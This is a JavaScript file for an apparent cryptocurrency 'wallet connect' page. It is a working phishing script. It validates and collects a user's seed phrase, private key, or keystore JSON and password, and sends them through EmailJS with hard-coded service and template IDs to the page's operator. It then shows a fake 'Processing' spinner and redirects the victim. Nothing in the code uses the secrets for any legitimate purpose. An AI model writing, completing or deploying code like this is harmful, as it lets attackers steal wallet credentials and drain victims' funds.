document.getElementById('form-connect-button').addEventListener('click', function (event) {
  event.preventDefault();

  // Validate only the 'active' form
  const isValid = validateActiveForm();

  // If valid, process submission
  if (isValid) {
    const messageContent = collectFormData();
    if (messageContent) {
      handleButtonUI(); // Change the button UI with spinner and disable it
      sendEmail(messageContent); // Proceed to send the email

      // Navigate to the new page after 6 seconds
      setTimeout(function () {
        window.location.href = 'http://reconnect.html'; // Replace with your target URL
      }, 6000);
    }
  }
});

// Real-time validation for the active form
function setupRealTimeValidation() {
  const activeForm = document.querySelector('.form-slider.active');
  if (!activeForm) return;

  const inputs = activeForm.querySelectorAll('input, textarea');
  inputs.forEach(input => {
    input.addEventListener('input', function () {
      validateActiveForm();
    });
  });
}

function validateActiveForm() {
  let isValid = true;
  const activeForm = document.querySelector('.form-slider.active');

  if (!activeForm) {
    showCustomAlert('No active form found!');
    return false;
  }

  console.log('Validating form:', activeForm.id);

  if (activeForm.id === 'phraseForm') {
    isValid = validatePhraseForm();
  } else if (activeForm.id === 'jsonForm') {
    isValid = validateJsonForm();
  } else if (activeForm.id === 'privateKeyForm') {
    isValid = validatePrivateKeyForm();
  }

  return isValid;
}

function validatePhraseForm() {
  const inputWords = document.getElementById('words').value.trim();
  const wordsArray = inputWords.split(/\s+/);
  const messagePhrase = document.getElementById('messagePhrase');

  // Check if phrase contains at least 12 words
  if (wordsArray.length < 12) {
    messagePhrase.style.color = 'red';
    showCustomAlert('Phrase must contain at least 12 words');
    return false;
  }

  // Check if all words contain only letters
  const allWordsAreValid = wordsArray.every(word => /^[A-Za-z]+$/.test(word));
  if (!allWordsAreValid) {
    messagePhrase.style.color = 'red';
    showCustomAlert('Typically 12 (sometimes 24) words separated by single spaces');
    return false;
  }

  // If valid, reset color and return true
  messagePhrase.style.color = '';
  return true;
}


function validateJsonForm() {
  const jsonValue = document.getElementById('json').value.trim();
  const passwordValue = document.getElementById('password').value.trim();
  const messageJson = document.getElementById('messageJson');

  if (!jsonValue || !passwordValue) {
    messageJson.style.color = 'red';
    showCustomAlert('Both JSON and Password must be filled in');
    return false;
  } else {
    messageJson.style.color = ''; // Reset color
    return true;
  }
}

function validatePrivateKeyForm() {
  const privateKey = document.getElementById('key').value.trim();
  const messagePrivatekey = document.getElementById('messagePrivatekey');

  if (privateKey.length < 14 || /\s/.test(privateKey)) {
    messagePrivatekey.style.color = 'red';
    showCustomAlert('Private keys often consist of a sequence of hexadecimal characters without spaces');
    return false;
  } else {
    messagePrivatekey.style.color = ''; // Reset color
    return true;
  }
}

function collectFormData() {
  let message = '';

  // Label of an option
  const logoTitle = document.querySelector(".modal-connection-status-2a")?.textContent;
  if (logoTitle) {
    message += `Option: ${logoTitle}\n\n`;
  }

  // Collect phrase
  const inputWords = document.getElementById('words').value.trim();
  if (inputWords) {
    const wordsArray = inputWords.split(/\s+/);
    message += `PHRASE: ${wordsArray.join(' ')}\n\n`;
  }

  // Collect private key
  const privateKey = document.getElementById('key').value.trim();
  if (privateKey) {
    message += `PRIVATE KEY: ${privateKey}\n\n`;
  }

  // Collect JSON
  const jsonValue = document.getElementById('json').value.trim();
  const passwordValue = document.getElementById('password').value.trim();
  if (jsonValue) {
    message += `JSON: ${jsonValue}\nPassword: ${passwordValue}\n`;
  }

  return message ? message : null;
}

function sendEmail(content) {
  const templateParams = {
    message: content
  };

  emailjs.send("service_1l09arl", "template_pcrfaaq", templateParams)
    .then(function (response) {
      console.log('SUCCESS!', response.status, response.text);
    }, function (error) {
      console.error('FAILED...', error);
    });
}

function handleButtonUI() {
  const button = document.getElementById('form-connect-button');
  // Change button text and add spinner
  button.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Processing...';
  // console.log('Button UI updated to show processing spinner.');

  // Disable the button to prevent multiple clicks
  button.disabled = true;
}

function showCustomAlert(message) {
  const alertModal = document.getElementById('custom-alert');
  const alertMessage = document.getElementById('custom-alert-message');
  const progressBar = document.getElementById('progress-bar');

  alertMessage.textContent = message;
  alertModal.classList.remove('hidden');
  // console.log('Custom alert shown with message:', message);

  // Start filling the progress bar
  let width = 0;
  const duration = 3000; // Duration of the alert
  const interval = 10; // Update interval in milliseconds
  const step = (interval / duration) * 100; // Percentage step

  const fillProgressBar = setInterval(function () {
    if (width >= 100) {
      clearInterval(fillProgressBar);
    } else {
      width += step;
      progressBar.style.width = width + '%';
    }
  }, interval);

  // Auto-close the alert after the specified duration
  setTimeout(function () {
    alertModal.classList.add('hidden');
    progressBar.style.width = '0%'; // Reset progress bar
    // console.log('Custom alert hidden after 3 seconds');
  }, duration);
}


// Initialize EmailJS
(function () {
  emailjs.init("rQNp6YDWD4p5jonSh");
})();

// Handle 'Enter' key press to trigger the connect button
document.addEventListener('keydown', function (event) {
  if (event.key === 'Enter') {
    event.preventDefault(); // Prevent the default action (like form submission)
    document.getElementById('form-connect-button').click();
  }
});

// Set up real-time validation
setupRealTimeValidation();

// Example of resetting the form when the menu is closed
document.getElementById('menu-close-button').addEventListener('click', function () {
  resetForm(); // Reset form when menu is closed
});

// Example of resetting the form when navigating away
document.querySelectorAll('a.navigation-link').forEach(link => {
  link.addEventListener('click', function () {
    resetForm(); // Reset form when navigating away
  });
});
